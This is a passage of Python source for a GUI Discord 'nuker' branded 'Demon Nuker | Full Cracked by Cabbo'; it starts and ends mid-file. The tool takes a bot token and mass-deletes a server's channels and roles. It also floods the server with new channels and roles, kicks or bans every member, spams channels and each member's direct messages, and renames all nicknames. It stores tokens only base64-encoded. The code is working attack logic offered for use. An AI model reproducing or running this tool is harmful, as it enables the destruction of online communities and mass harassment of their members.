def get_guild_roles(token : str, guild_id : str):
    return json.loads(requests.get(f"{API_URL}/guilds/{guild_id}/roles", headers={"Authorization": f"Bot {token}"}).text)

def get_bot_infos(token : str):
    return json.loads(requests.get(f"{API_URL}/users/@me", headers={"Authorization": f"Bot {token}"}).text)


def edit_bot_name(token : str, username : str):
    return json.loads(requests.patch(f"{API_URL}/users/@me", data={"username": username}, headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"}).text)

def delete_channel(token : str, channel_id):
    return json.loads(requests.delete(f"{API_URL}/channels/{channel_id}", headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"}).text)

def delete_role(token : str, role_id, guild_id, n, name):
    try:
        res =  json.loads(requests.delete(f"{API_URL}/guilds/{guild_id}/roles/{role_id}", headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"}).text)
        RolesOBJ.Log.insertItem(n, f"! {name} - {res['message']}")
        return res
    except:
        RolesOBJ.Log.insertItem(n, f"- Deleted {name}")

def create_channel(token : str, guild_id : str, name : str):
    return requests.post(url = f"{API_URL}/guilds/{guild_id}/channels", data=json.dumps({"type": 0, "name": name, "permission_overwrites": []}), headers={
        "authorization": f"Bot {token}",
        "Content-Type": "application/json"})

def create_role(token : str, guild_id : str, role_name : str):
    res = json.loads(requests.post(f"{API_URL}/guilds/{guild_id}/roles", data=json.dumps({"name": role_name, "color": random.randint(0, 0xffffff)}), headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"}).text)
    return res

def kick_member(token : str, guild_id : str, member_id : str, n : int):
    global BanKickOBJ
    res = requests.delete(f"{API_URL}/guilds/{guild_id}/members/{member_id}", headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"}).text
    try: 
        res = json.loads(res)
        BanKickOBJ.Log.insertItem(n, f"! {member_id} - {res['message']}")
    except:
        BanKickOBJ.Log.insertItem(n, f"- kicked {member_id}")
        return "ok"

def ban_member(token : str, guild_id : str, member_id : str, n : int):
    global BanKickOBJ
    res = requests.put(f"{API_URL}/guilds/{guild_id}/bans/{member_id}", headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"}, data=json.dumps({"delete_message_days": 7, "reason": "ahah yes"})).text
    try: 
        res = json.loads(res)
        BanKickOBJ.Log.insertItem(n, f"! {member_id} - {res['message']}")
    except:
        BanKickOBJ.Log.insertItem(n, f"- banned {member_id}")
    
    return "ok"

def create_dm(token : str, user_id : str):
    return json.loads(requests.post(f"{API_URL}/users/@me/channels", data=json.dumps({"recipients": [user_id]}), headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"}).text)

def send_channel_message(token : str, channel_id : str, content : str):
    res = json.loads(requests.post(f"{API_URL}/channels/{channel_id}/messages", data=json.dumps({"content": content}), headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"}).text)
    return res

def channels_deleter():
    global token, selected_guild
    guild_id = bot_guilds[selected_guild.currentText()]
    n = 0
    for channel in get_guild_channels(token, guild_id):
        threading.Thread(target=delete_channel, args=(token, channel["id"])).start()
        ChannelsOBJ.Log.insertItem(n, f"- Deleted {channel['id']}")
        n += 1
        time.sleep(0.02)

def roles_deleter():
    global token, selected_guild
    guild_id = bot_guilds[selected_guild.currentText()]
    n = 0
    for role in get_guild_roles(token, guild_id):
        threading.Thread(target=delete_role, args=(token, role["id"], guild_id, n, role["name"])).start()
        n += 1
        time.sleep(0.02)

def mass_role_generator(name=None, random=False, guild_id = ""):
    global stop_role_generator, RolesOBJ
    timeout = float(RolesOBJ.timeout.text())
    n = 0
    while not stop_role_generator:
        if random: name = random_name()
        threading.Thread(target=create_role, args=(token, guild_id, name)).start()
        item = f"+ [{n}] {name}"
        RolesOBJ.Log.insertItem(n, item)
        time.sleep(timeout)
        n += 1
    stop_role_generator = False


def channel_spam(token : str, channel_id : str, content : str, timeout : int, self):
    while not stop_channel_spamming:
        threading.Thread(target=send_channel_message, args=(token, channel_id, content)).start()
        self.Log.addItem(f"+ 1 Thread for {channel_id}")
        self.Log.scrollToBottom()
        time.sleep(timeout)

def dm_spam(token : str, user_id : str, content : str, timeout : int, self):
    res = create_dm(token, user_id)
    if "message" in res and res["message"] == 'Cannot send messages to this user':
        return

    while not stop_dm_spamming:
        threading.Thread(target=send_channel_message, args=(token, res["id"], content)).start()
        self.Log.addItem(f"+ 1 Thread for {res['id']}")
        self.Log.scrollToBottom()
        time.sleep(timeout)

def mass_channel_generator(name=None, random = False, guild_id : str = ""):
    global stop_channel_generator, ChannelsOBJ
    n = 0
    timeout = float(ChannelsOBJ.timeout.text())
    ChannelsOBJ.Log.clear()
    while not stop_channel_generator:
        if random: name = random_name()
        threading.Thread(target=create_channel, args=(token, guild_id, name)).start()
        item = f"+ [{n}] {name}"
        ChannelsOBJ.Log.insertItem(n, item)
        n += 1
        time.sleep(timeout)
    stop_channel_generator = False

def kick_all_members(token, guild_id):
    n = 0
    members = get_guild_members(token, guild_id)
    timeout = float(BanKickOBJ.KickTimeout.text())
    for member in members:
        threading.Thread(target=kick_member, args=(token, guild_id, member['user']['id'], n)).start()
        n += 1
        time.sleep(timeout)

def ban_all_members(token, guild_id):
    n = 0
    members = get_guild_members(token, guild_id)
    timeout = float(BanKickOBJ.KickTimeout.text())
    for member in members:
        threading.Thread(target=ban_member, args=(token, guild_id, member['user']['id'], n)).start()
        n += 1
        time.sleep(timeout)

def nicknames_spam(self):
    global selected_guild
    guild_id = bot_guilds[selected_guild.currentText()]
    for member in get_guild_members(token, guild_id):
        if self.Random.isChecked():
            nick = random_name()
        else:
            nick = self.NicknameEdit.text()
        threading.Thread(target=change_nickname, args=(token, guild_id, member['user']['id'], nick)).start()
        self.Log.addItem(f"- {member['user']['username']}#{member['user']['discriminator']}")
        time.sleep(float(self.timeout.text()))


class NewVersion(QMainWindow):
    def __init__(self):
        global new_version
        super(NewVersion, self).__init__()
        f = io.StringIO(NewVersionTemplate)
        uic.loadUi(f, self)


        title = "Demon Nuker | Full Cracked by Cabbo"
        self.setWindowTitle(title)

        self.infoLabel.setText(f"We published a new version of the tool\nYour version: {THIS_VERSION}\nNew version: {new_version}")

        self.DownloadButton.clicked.connect(self.update)
        self.DownloadButton2.clicked.connect(lambda: webbrowser.open("https://demon-team.web.app/api/DemonNuker/Demon_Nuker.exe"))

        

    def update(self):
        file_name, _ = QFileDialog.getSaveFileName(self, "Demon Nuker - new version", "Demon Nuker.exe")
        if not file_name:
            return
        self.infoLabel.setText(f"Loading...\nit could take a few minutes ..")
        threading.Thread(target=new_version_downloader, args=(self, file_name)).start()

class AuthError(QMainWindow):
    def __init__(self):
        super(AuthError, self).__init__()
        f = io.StringIO(errorTemplate)
        uic.loadUi(f, self)

        title = "Demon Nuker | Error"
        self.setWindowTitle(title)
        self.RetryButton.clicked.connect(self.return_to_login)
    
    def return_to_login(self):
        login = Login()
        widget.addWidget(login)
        widget.setCurrentIndex(widget.currentIndex()+1)


class Login(QMainWindow):
    def __init__(self):
        super(Login, self).__init__()
        f = io.StringIO(authTemplate)
        uic.loadUi(f, self)
        self.setWindowTitle("Demon Nuker | Auth - Full Cracked by Cabbo")

        self.LoginButton.clicked.connect(self.check_key)
        
    
    def check_key(self):
        gg = checkkey(self.KeyEdit.text())
        if gg:
            with open(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo/key.data", "w") as key_f:
                key_f.write(crypt(self.KeyEdit.text()))
            main = Main()
            widget.addWidget(main)
            widget.setCurrentIndex(widget.currentIndex()+1)
        else:
            error = AuthError()
            widget.addWidget(error)
            widget.setCurrentIndex(widget.currentIndex()+1)

class Main(QMainWindow):
    def __init__(self):
        super(Main, self).__init__()
        f = io.StringIO(NukeBotTemplate)
        uic.loadUi(f, self)

        title = "Demon Nuker | Full Cracked by Cabbo"
        self.setWindowTitle(title)

        
        self.Title.setText(f"Cracked by Cabbo")
        self.InfoButton.clicked.connect(self.info)
        self.TutorialButton.clicked.connect(self.tutorial)
        self.DDPButton.clicked.connect(self.ddp)
        self.HostButton.clicked.connect(self.host)
        self.InsertToken.clicked.connect(self.set_input)

        with open(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo/recent_tokens.data", "r") as recent_tokens:
            for token in recent_tokens.read().splitlines():
                if token != "":
                    decrypted_token = base64.b64decode(token.encode('ascii')).decode('ascii')
                    self.TokensList.addItem(decrypted_token)
        

    def set_input(self):
        self.TokenEdit.setText(self.TokensList.currentText())

    def host(self):
        global token, BotThread, bot_infos
        token = self.TokenEdit.text()
        res = get_bot_infos(token)
        if "message" in res:
            if res["message"] == "401: Unauthorized":
                QMessageBox.about(self, "ERROR", "Invalid token")
            else:
                QMessageBox.about(self, "ERROR", res["message"])
            return
        bot_infos = res

        with open(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo/recent_tokens.data", "a") as recent_tokens:
            encrypted_token = base64.b64encode(token.encode('ascii')).decode('ascii')
            if not encrypted_token in open(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo/recent_tokens.data", "r").read():
                recent_tokens.write(f"{encrypted_token}\n")

        dashboard = Dashboard()
        widget.addWidget(dashboard)
        widget.setCurrentIndex(widget.currentIndex()+1)
        

    def tutorial(self):
        webbrowser.open('https://www.youtube.com/channel/UCtiMm3gAfTipwZiEWc4Veaw')
    
    def ddp(self):
        webbrowser.open('https://discord.com/developers/')

    def info(self):
        if self.Info.y() != 20:
            self.Info.move(450, 20)
            return
        if self.Info.y() == 20:
            self.Info.move(450, -100)

class Nicknames(QMainWindow):
    def __init__(self):
        super(Nicknames, self).__init__()
        f = io.StringIO(nicknamesTemplate)
        uic.loadUi(f, self)


        self.MenuBotInfo.clicked.connect(self.Dashboard)
        self.MenuServerInfo.clicked.connect(self.menuserverinfo)
        self.MenuChannels.clicked.connect(self.Channels)
        self.MenuBanKick.clicked.connect(self.BanKick)
        self.MenuSpam.clicked.connect(self.Spam)
        self.MenuRoles.clicked.connect(self.Roles)
        self.MenuCredits.clicked.connect(self.Credits)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        self.StartEdit.clicked.connect(self.change_nicknames)
        self.DeleteAll.clicked.connect(self.reset_all_nicknames)
        self.MenuDMSpam.clicked.connect(self.menudmspam)
        self.Clear.clicked.connect(self.Log.clear)

    def reset_all_nicknames(self):
        self.NicknameEdit.setText("")
        try:
            float(self.timeout.text())
        except:
            QMessageBox.about(ChannelsOBJ, "ERROR", "Invalid timeout value")
            return
        threading.Thread(target=nicknames_spam, args=(self,)).start()

    def change_nicknames(self):
        try:
            float(self.timeout.text())
        except:
            QMessageBox.about(ChannelsOBJ, "ERROR", "Invalid timeout value")
            return
        threading.Thread(target=nicknames_spam, args=(self,)).start()

    def Dashboard(self):
        dashboard = Dashboard()
        widget.addWidget(dashboard)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menuserverinfo(self):
        serverinfo = ServerInfo()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menunicknames(self):
        serverinfo = Nicknames()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def Channels(self):
        channels = Channels()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def BanKick(self):
        channels = BanKick()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Spam(self):
        channels = Spam()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Roles(self):
        channels = Roles()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def Credits(self):
        channels = Credits()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menudmspam(self):
        dmspam = DMSpam()
        widget.addWidget(dmspam)
        widget.setCurrentIndex(widget.currentIndex()+1)

class Dashboard(QMainWindow):
    def __init__(self):
        global token, bot_infos, bot_guilds, selected_guild
    
        super(Dashboard, self).__init__()
        f = io.StringIO(DashboardTemplate)
        uic.loadUi(f, self)
        
        selected_guild = self.ServerList
        title = "Demon Nuker | Dashboard"
        self.setWindowTitle(title)

        self.Token.setText("Token: " + token)

        #Menu
        self.MenuServerInfo.clicked.connect(self.menuserverinfo)
        self.MenuChannels.clicked.connect(self.Channels)
        self.MenuBanKick.clicked.connect(self.BanKick)
        self.MenuSpam.clicked.connect(self.Spam)
        self.MenuRoles.clicked.connect(self.Roles)
        self.MenuCredits.clicked.connect(self.Credits)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        self.MenuDMSpam.clicked.connect(self.menudmspam)
        
        bot_guilds_res = get_guilds_list(token)

        self.ServerWithBot.setText("Server with the bot: " + str(len(bot_guilds_res)))

        image_url = f"https://cdn.discordapp.com/avatars/{bot_infos['id']}/{bot_infos['avatar']}.webp"; bot_avatar_url = image_url

        image = QImage()
        image.loadFromData(requests.get(image_url).content)
        image.scaled(60, 60)
        image.size()

        pixmap = QPixmap(image).scaled(40, 40)
        
        self.BotImage.setPixmap(pixmap)

        self.BotName.setText(f"BotName: {bot_infos['username']}#{bot_infos['discriminator']}")

        
        for guild in bot_guilds_res:
            self.ServerList.addItem(guild["name"] + " - " + guild["id"])
            bot_guilds[guild["name"] + " - " + guild["id"]] = guild["id"]

    def menuserverinfo(self):
        serverinfo = ServerInfo()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menunicknames(self):
        serverinfo = Nicknames()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def Channels(self):
        channels = Channels()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def BanKick(self):
        channels = BanKick()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Spam(self):
        channels = Spam()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Roles(self):
        channels = Roles()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def Credits(self):
        channels = Credits()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menudmspam(self):
        dmspam = DMSpam()
        widget.addWidget(dmspam)
        widget.setCurrentIndex(widget.currentIndex()+1)

class ServerInfo(QMainWindow):
    def __init__(self):
        global selected_guild
        super(ServerInfo, self).__init__()
        f = io.StringIO(ServerInfoTemplate)
        uic.loadUi(f, self)
        title = "Demon Nuker | ServerInfo"
        self.setWindowTitle(title)



        #Menu
        self.MenuBotInfo.clicked.connect(self.Dashboard)
        self.MenuChannels.clicked.connect(self.Channels)
        self.MenuBanKick.clicked.connect(self.BanKick)
        self.MenuSpam.clicked.connect(self.Spam)
        self.MenuRoles.clicked.connect(self.Roles)
        self.MenuCredits.clicked.connect(self.Credits)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        self.MenuDMSpam.clicked.connect(self.menudmspam)
        self.infoLabel.setText("Loading...")


        threading.Thread(target=ServerInfoYes, args=(self,)).start()
        
        

    def Dashboard(self):
        dashboard = Dashboard()
        widget.addWidget(dashboard)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menunicknames(self):
        serverinfo = Nicknames()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def Channels(self):
        channels = Channels()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def BanKick(self):
        channels = BanKick()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Spam(self):
        channels = Spam()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Roles(self):
        channels = Roles()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def Credits(self):
        channels = Credits()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menudmspam(self):
        dmspam = DMSpam()
        widget.addWidget(dmspam)
        widget.setCurrentIndex(widget.currentIndex()+1)

class Channels(QMainWindow):
    def __init__(self):
        global ChannelsOBJ
        super(Channels, self).__init__()
        f = io.StringIO(ChannelsTemplate)
        uic.loadUi(f, self)
        ChannelsOBJ = self
        title = "Demon Nuker | Channels"
        self.setWindowTitle(title)



        #Menu
        self.MenuBotInfo.clicked.connect(self.Dashboard)
        self.MenuServerInfo.clicked.connect(self.ServerInfo)
        self.MenuBanKick.clicked.connect(self.BanKick)
        self.MenuSpam.clicked.connect(self.Spam)
        self.MenuRoles.clicked.connect(self.Roles)
        self.MenuCredits.clicked.connect(self.Credits)
        self.MenuDMSpam.clicked.connect(self.menudmspam)
        self.GenerateEdit.clicked.connect(self.create_channels)
        self.StopEdit.clicked.connect(self.stop_channels)
        self.DeleteAll.clicked.connect(self.delete_all_channels)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        self.Clear.clicked.connect(self.Log.clear)
        #


    def delete_all_channels(self):
        threading.Thread(target=channels_deleter).start()

    def create_channels(self):
        global selected_guild
        guild_id = bot_guilds[selected_guild.currentText()]
        try:
            float(self.timeout.text())
        except:
            QMessageBox.about(ChannelsOBJ, "ERROR", "Invalid timeout value")
            return
        if not self.Random.isChecked():
            threading.Thread(target=mass_channel_generator, args=(self.NameEdit.text(), False, guild_id)).start()
        else:
            threading.Thread(target=mass_channel_generator, args=("", True, guild_id)).start()
    
    def stop_channels(self):
        global stop_channel_generator
        stop_channel_generator = True


    def Dashboard(self):
        dashboard = Dashboard()
        widget.addWidget(dashboard)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def ServerInfo(self):
        serverinfo = ServerInfo()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def BanKick(self):
        channels = BanKick()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Spam(self):
        channels = Spam()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Roles(self):
        channels = Roles()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def Credits(self):
        channels = Credits()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menunicknames(self):
        serverinfo = Nicknames()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menudmspam(self):
        dmspam = DMSpam()
        widget.addWidget(dmspam)
        widget.setCurrentIndex(widget.currentIndex()+1)

class BanKick(QMainWindow):
    def __init__(self):
        global BanKickOBJ
        super(BanKick, self).__init__()
        f = io.StringIO(BanKickTemplate)
        uic.loadUi(f, self)
        self.n = 0
        BanKickOBJ = self
        title = "Demon Nuker | Ban / Kick"
        self.setWindowTitle(title)



        #Menu
        self.MenuBotInfo.clicked.connect(self.Dashboard)
        self.MenuServerInfo.clicked.connect(self.ServerInfo)
        self.MenuChannels.clicked.connect(self.Channels)
        self.MenuSpam.clicked.connect(self.Spam)
        self.MenuRoles.clicked.connect(self.Roles)
        self.MenuCredits.clicked.connect(self.Credits)
        self.KickButton.clicked.connect(self.kick_user)
        self.BanButton.clicked.connect(self.ban_user)
        self.KickAllButton.clicked.connect(self.kick_all)
        self.BanAllButton.clicked.connect(self.ban_all)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        self.MenuDMSpam.clicked.connect(self.menudmspam)
        #



    def kick_user(self):
        global selected_guild
        guild_id = bot_guilds[selected_guild.currentText()]
        kick_member(token, guild_id, self.KickUserEdit.text(), self.n)

    def ban_user(self):
        global selected_guild
        guild_id = bot_guilds[selected_guild.currentText()]
        ban_member(token, guild_id, self.BanUserEdit.text(), self.n)

    def kick_all(self):
        global selected_guild
        guild_id = bot_guilds[selected_guild.currentText()]
        try:
            float(self.KickTimeout.text())
        except:
            QMessageBox.about(self, "ERROR", "Invalid kick timeout value")
            return

        threading.Thread(target=kick_all_members, args=(token, guild_id)).start()

    def ban_all(self):
        global selected_guild
        guild_id = bot_guilds[selected_guild.currentText()]
        try:
            float(self.BanTimeout.text())
        except:
            QMessageBox.about(self, "ERROR", "Invalid ban timeout value")
            return

        threading.Thread(target=ban_all_members, args=(token, guild_id)).start()


    def Dashboard(self):
        dashboard = Dashboard()
        widget.addWidget(dashboard)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def ServerInfo(self):
        serverinfo = ServerInfo()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Channels(self):
        channels = Channels()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Spam(self):
        channels = Spam()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Roles(self):
        channels = Roles()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def Credits(self):
        channels = Credits()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menunicknames(self):
        serverinfo = Nicknames()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menudmspam(self):
        dmspam = DMSpam()
        widget.addWidget(dmspam)
        widget.setCurrentIndex(widget.currentIndex()+1)

class Spam(QMainWindow):
    def __init__(self):
        global selected_guild
        self.channels = {}
        super(Spam, self).__init__()
        f = io.StringIO(SpamTemplate)
        uic.loadUi(f, self)
        title = "Demon Nuker | Spam"
        self.setWindowTitle(title)



        #Menu
        self.MenuBotInfo.clicked.connect(self.Dashboard)
        self.MenuServerInfo.clicked.connect(self.ServerInfo)
        self.MenuChannels.clicked.connect(self.Channels)
        self.MenuBanKick.clicked.connect(self.BanKick)
        self.MenuRoles.clicked.connect(self.Roles)
        self.MenuCredits.clicked.connect(self.Credits)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        self.ChannelSpammingButton.clicked.connect(self.channel_spam)
        self.ChannelStopSpammingButton.clicked.connect(self.stop_channel_spam)
        self.MenuDMSpam.clicked.connect(self.menudmspam)
        
        #

        self.guild_id = bot_guilds[selected_guild.currentText()]
        
        for channel in get_guild_channels(token, self.guild_id):
            if channel["type"] == 0:
                self.ChannelList.addItem(channel["name"] + " - " + channel["id"])
                self.channels[channel["name"] + " - " + channel["id"]] = channel["id"]



    def channel_spam(self):
        global stop_channel_spamming
        stop_channel_spamming = False
        if self.AllChannel.isChecked():
            for channel in get_guild_channels(token, self.guild_id):
                threading.Thread(target=channel_spam, args=(token, channel["id"], self.plainTextEdit.toPlainText(), self.doubleSpinBox.value(), self)).start()
        else:
            channel_id = self.channels[self.ChannelList.currentText()]
            threading.Thread(target=channel_spam, args=(token, channel_id, self.plainTextEdit.toPlainText(), self.doubleSpinBox.value(), self)).start()
            self.ChannelSpammingButton.setText("spamming...")

    def stop_channel_spam(self):
        global stop_channel_spamming
        self.ChannelSpammingButton.setText("Start spamming")
        stop_channel_spamming = True



    def Dashboard(self):
        dashboard = Dashboard()
        widget.addWidget(dashboard)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def ServerInfo(self):
        serverinfo = ServerInfo()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Channels(self):
        channels = Channels()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def BanKick(self):
        channels = BanKick()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Roles(self):
        channels = Roles()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Credits(self):
        channels = Credits()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menunicknames(self):
        serverinfo = Nicknames()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menudmspam(self):
        dmspam = DMSpam()
        widget.addWidget(dmspam)
        widget.setCurrentIndex(widget.currentIndex()+1)

class DMSpam(QMainWindow):
    def __init__(self):
        global selected_guild
        self.channels = {}
        super(DMSpam, self).__init__()
        f = io.StringIO(DMSpamTemplate)
        uic.loadUi(f, self)
        title = "Demon Nuker | DMSpam"
        self.setWindowTitle(title)



        #Menu
        self.MenuBotInfo.clicked.connect(self.Dashboard)
        self.MenuServerInfo.clicked.connect(self.ServerInfo)
        self.MenuChannels.clicked.connect(self.Channels)
        self.MenuBanKick.clicked.connect(self.BanKick)
        self.MenuRoles.clicked.connect(self.Roles)
        self.MenuCredits.clicked.connect(self.Credits)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        self.MenuSpam.clicked.connect(self.Spam)
        self.UserSpammingButton.clicked.connect(self.dm_spam)
        self.UserStopSpammingButton.clicked.connect(self.stop_dm_spam)
        #

        self.guild_id = bot_guilds[selected_guild.currentText()]


    def dm_spam(self):
        global stop_dm_spamming
        stop_dm_spamming = False
        if self.AllUser.isChecked():
            for user in get_guild_members(token, self.guild_id):
                content = self.plainTextEdit.toPlainText().replace("[mention]", f"<@!{user['user']['id']}>")
                threading.Thread(target=dm_spam, args=(token, user["user"]["id"], content, self.doubleSpinBox.value(), self)).start()
        else:
            content = self.plainTextEdit.toPlainText().replace("[mention]", f"<@!{self.SpamUserEdit.text()}>")
            threading.Thread(target=dm_spam, args=(token, self.SpamUserEdit.text(), content, self.doubleSpinBox.value(), self)).start()
            self.UserSpammingButton.setText("spamming...")


    def stop_dm_spam(self):
        global stop_dm_spamming
        self.UserSpammingButton.setText("Start spamming")
        stop_dm_spamming = True



    def Dashboard(self):
        dashboard = Dashboard()
        widget.addWidget(dashboard)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def ServerInfo(self):
        serverinfo = ServerInfo()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Channels(self):
        channels = Channels()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def BanKick(self):
        channels = BanKick()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Roles(self):
        channels = Roles()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Credits(self):
        channels = Credits()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menunicknames(self):
        serverinfo = Nicknames()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def Spam(self):
        channels = Spam()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

class Roles(QMainWindow):
    def __init__(self):
        global RolesOBJ
        super(Roles, self).__init__()
        f = io.StringIO(RolesTemplate)
        uic.loadUi(f, self)
        RolesOBJ = self
        title = "Demon Nuker | Roles"
        self.setWindowTitle(title)



        #Menu
        self.MenuBotInfo.clicked.connect(self.Dashboard)
        self.MenuServerInfo.clicked.connect(self.ServerInfo)
        self.MenuChannels.clicked.connect(self.Channels)
        self.MenuBanKick.clicked.connect(self.BanKick)
        self.MenuSpam.clicked.connect(self.Spam)
        self.MenuCredits.clicked.connect(self.Credits)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        self.MenuDMSpam.clicked.connect(self.menudmspam)
        self.StopButton.clicked.connect(self.stop_roles)
        self.GenerateButton.clicked.connect(self.create_roles)
        self.DeleteAll.clicked.connect(self.delete_all_roles)
        self.Clear.clicked.connect(self.Log.clear)
        #


    def delete_all_roles(self):
        self.Log.clear()
        threading.Thread(target=roles_deleter).start()

    def create_roles(self):
        global stop_role_generator, selected_guild
        self.Log.clear()
        stop_role_generator = False
        try:
            float(self.timeout.text())
        except:
            QMessageBox.about(ChannelsOBJ, "ERROR", "Invalid timeout value")
            return
        guild_id = bot_guilds[selected_guild.currentText()]
        if not self.Random.isChecked():
            threading.Thread(target=mass_role_generator, args=(self.NameEdit.text(), False, guild_id)).start()
        else:
            threading.Thread(target=mass_role_generator, args=("", True, guild_id)).start()
    
    def stop_roles(self):
        global stop_role_generator
        stop_role_generator = True

    def Dashboard(self):
        dashboard = Dashboard()
        widget.addWidget(dashboard)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def ServerInfo(self):
        serverinfo = ServerInfo()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Channels(self):
        channels = Channels()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def BanKick(self):
        channels = BanKick()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Spam(self):
        channels = Spam()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Credits(self):
        channels = Credits()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menunicknames(self):
        serverinfo = Nicknames()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menudmspam(self):
        dmspam = DMSpam()
        widget.addWidget(dmspam)
        widget.setCurrentIndex(widget.currentIndex()+1)

class Credits(QMainWindow):
    def __init__(self):
        super(Credits, self).__init__()
        f = io.StringIO(CreditsTemplate)
        uic.loadUi(f, self)
        title = "Demon Nuker | Credits"
        self.setWindowTitle(title)


        self.DarkGUI.clicked.connect(self.darkgui)


        #Menu
        self.MenuBotInfo.clicked.connect(self.Dashboard)
        self.MenuServerInfo.clicked.connect(self.ServerInfo)
        self.MenuChannels.clicked.connect(self.Channels)
        self.MenuBanKick.clicked.connect(self.BanKick)
        self.MenuSpam.clicked.connect(self.Spam)
        self.MenuRoles.clicked.connect(self.Roles)
        self.MenuDMSpam.clicked.connect(self.menudmspam)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        self.MenuNicknames.clicked.connect(self.menunicknames)
        #


    def darkgui(self):
        webbrowser.open("https://www.youtube.com/channel/UCtiMm3gAfTipwZiEWc4Veaw")
    



    def Dashboard(self):
        dashboard = Dashboard()
        widget.addWidget(dashboard)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def ServerInfo(self):
